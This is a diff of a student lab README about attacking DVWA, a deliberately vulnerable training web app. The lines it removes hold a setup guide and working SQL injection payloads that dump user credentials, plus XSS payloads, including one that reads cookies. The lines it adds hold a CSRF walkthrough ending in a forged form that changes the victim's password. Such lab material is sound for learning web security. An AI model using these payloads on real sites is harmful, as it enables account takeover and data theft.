@@ -1,83 +1,84 @@
-# Implementing SQL Injection & Cross Site Scripting using DVWA
+# Study of Cross Site Request Forgery (CSRF)
 
-### DVWA
-Damn Vulnerable Web Application (DVWA) is a PHP/MySQL web application that is damn vulnerable. Its main goal is to be an aid for security professionals to test their skills and tools in a legal environment, help web developers better understand the processes of securing web applications and to aid both students & teachers to learn about web application security in a controlled class room environment.
+### Burp-Suite
+Burp or Burp Suite is a set of tools used for penetration testing of web applications. It is developed by the company named Portswigger, which is also the alias of its founder Dafydd Stuttard. BurpSuite aims to be an all in one set of tools and its capabilities can be enhanced by installing add-ons that are called BApps.
+It is the most popular tool among professional web app security researchers and bug bounty hunters. Its ease of use makes it a more suitable choice over free alternatives like OWASP ZAP. 
 
-The aim of DVWA is to practice some of the most common web vulnerabilities, with various levels of difficulty, with a simple straightforward interface. Please note, there are both documented and undocumented vulnerabilities with this software. This is intentional. You are encouraged to try and discover as many issues as possible.
+### CSRF
+Cross-site request forgery (also known as CSRF) is a web security vulnerability that allows an attacker to induce users to perform actions that they do not intend to perform. It allows an attacker to partly circumvent the same origin policy, which is designed to prevent different websites from interfering with each other.
 
-#### Setting up DVWA
-- **Step 1** : Type the following commands </br>
-  Setting up Apache Web server, Installting DVWA, Installing Mysql, 
-  ``` 
-  $ sudo apt install apache2 
-  $ sudo apt-get install git
-  $ cd /var/www/html/
-  $ sudo git clone https://github.com/ethicalhack3r/DVWA.git
-  $ sudo chmod -R 777 /var/www/html/DVWA/
-  $ sudo apt install mysql-server
-  $ mysql -u root -p
-  $ sudo service apache2 restart
-  $ sudo service mysql restart
-  ```
-  </br>
-- **Setp 2**: Type the following commands</br>
-  Configure DVWA
-  ```
-  $ sudo vim /var/www/html/dvwa/config/config.inc.php.dist
-  ```
-  Add the database name, user and password of the mysql database in the php file
-  ```
-  $ sudo vim /etc/php5/apache2/php.ini
-  ```
-  Add the following lines </br>
-   > **Enable Allow_url_fopen** </br>
-   > **Enable Allow_url_include**
-   </br>
-- **Setp 3**: </br>
-  Starting DVWA </br>
-  Open your Browser and type http://127.0.0.1/DVWA/setup.php </br>
-  Complete the basic setup process and you are ready to use your DVWA
-  
-### SQL Injection
-SQL injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. It generally allows an attacker to view data that they are not normally able to retrieve. This might include data belonging to other users, or any other data that the application itself is able to access. In many cases, an attacker can modify or delete this data, causing persistent changes to the application's content or behavior.
+In a successful CSRF attack, the attacker causes the victim user to carry out an action unintentionally. For example, this might be to change the email address on their account, to change their password, or to make a funds transfer. Depending on the nature of the action, the attacker might be able to gain full control over the user's account. If the compromised user has a privileged role within the application, then the attacker might be able to take full control of all the application's data and functionality.
 
-In some situations, an attacker can escalate an SQL injection attack to compromise the underlying server or other back-end infrastructure, or perform a denial-of-service attack
+### Solving CSRF in DVWA using Burp-Suite
+The first thing that was done is checking the source code . You can simply do this in DVWA by clicking view source in the bottom right.
+```
+<?php
 
-- Display the hostname of our web app </br>
-  ```' union select null, @@hostname#```</br>
-  
-- Display Database User </br>
-  ```test' union select null, user() #``` </br>
-  
-- Display the Database Name </br>
-  ```test' union select null, database() #```</br>
-  
-- List all tables in the information schema. </br>
-  ```test' and 1=0 union select null, table_name from information_schema.tables #```</br>
-  
-- Display all the column contents in the information schema users table </br>
-  ```test' and 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users #```</br>
-  
-- List all user tables in the information schema </br>
-  ```test' and 1=0 union select null, table_name from information_schema.tables where table_name like 'user%'# ```</br>
+if( isset( $_GET[ 'Change' ] ) ) {
+    // Get input
+    $pass_new  = $_GET[ 'password_new' ];
+    $pass_conf = $_GET[ 'password_conf' ];
 
+    // Do the passwords match?
+    if( $pass_new == $pass_conf ) {
+        // They do!
+        $pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
+        $pass_new = md5( $pass_new );
 
-### Cross Site Scripting (XSS)
-Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into otherwise benign and trusted websites. XSS attacks occur when an attacker uses a web application to send malicious code, generally in the form of a browser side script, to a different end user. Flaws that allow these attacks to succeed are quite widespread and occur anywhere a web application uses input from a user within the output it generates without validating or encoding it.
+        // Update the database
+        $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";
+        $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
 
-An attacker can use XSS to send a malicious script to an unsuspecting user. The end user’s browser has no way to know that the script should not be trusted, and will execute the script. Because it thinks the script came from a trusted source, the malicious script can access any cookies, session tokens, or other sensitive information retained by the browser and used with that site. These scripts can even rewrite the content of the HTML page.
+        // Feedback for the user
+        echo "<pre>Password Changed.</pre>";
+    }
+    else {
+        // Issue with passwords matching
+        echo "<pre>Passwords did not match.</pre>";
+    }
 
-- Reflected XSS payloads </br>
-  **Easy** :  ```<script>alert(“xss”)</script> ``` </br>
-  **Medium** : ```<Script>alert(“SMIT”)</Script>```</br>
-  **Hard** : ```<img src=x onerror=alert(“falcon”)>``` </br>
+    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
+}
 
-- Stored XSS Payloads</br>
-  **Easy** : ```<script>alert(document.domain)</script>``` </br>
-  **Medium** : ```<img src=x onerror=alert(document.domain)>```<br>
-  **Hard** : ```<body onload=alert(“bingo”)>```
+?> 
 
-- DOM XSS Payloads </br>
-  **Easy** : ```/?default=<script>alert(1)</script>``` </br>
-  **Medium** : ```/?default=English#<script>alert(1)</script>``` </br>
-  **Hard** : ```/?default=English#<script>alert(document.cookie)</script>```
+```
+The script takes the user input and checks if the two passwords match, if they do the password is updated, if not the password is not updated. What we can see here is there is no protection against CSRF, such as Anti-CSRF token.
+
+When we try to send a legitimate request from inside DVWA to change the ```New password``` paramter in CSRF challenege
+```
+GET /DVWA/vulnerabilities/csrf/?password_new=smit&password_conf=smiy&Change=Change HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Referer: http://localhost/DVWA/vulnerabilities/csrf/
+Cookie: security=low; PHPSESSID=h7ls4j5vqgj9olvdg9vedcij0f
+Upgrade-Insecure-Requests: 1
+```
+What we can see is it is a GET request and you can see the value of the new password has been changed to **smit**
+
+The next step is to view the html source code of the page. There is a form in there that makes a GET request. It looks just like this.
+
+```
+<form action="#" method="GET">
+New password:<br />
+<input type="password" AUTOCOMPLETE="off" name="password_new"><br />
+Confirm new password:<br />
+<input type="password" AUTOCOMPLETE="off" name="password_conf"><br />
+<br />
+<input type="submit" value="Change" name="Change">
+```
+
+It is the form that you see when you change the password. it takes the input from the user for a new password and confirm password. The below snippet is taken from the response body and changed according to our needs. Here the new password is **hacked by SMIT**
+
+```
+<form action=”http://localhost/DVWA-master/vulnerabilities/csrf/?" method=”GET”>
+ <h1>Click Me</h1>
+ <input type=”hidden” AUTOCOMPLETE=”off” name=”password_new” value=”hacked+by+smit”>
+ <input type=”hidden” AUTOCOMPLETE=”off” name=”password_conf” value=”hacked+by+smit”>
+ <input type=”submit” value=”Change” name=”Change”>
+</form>
+```
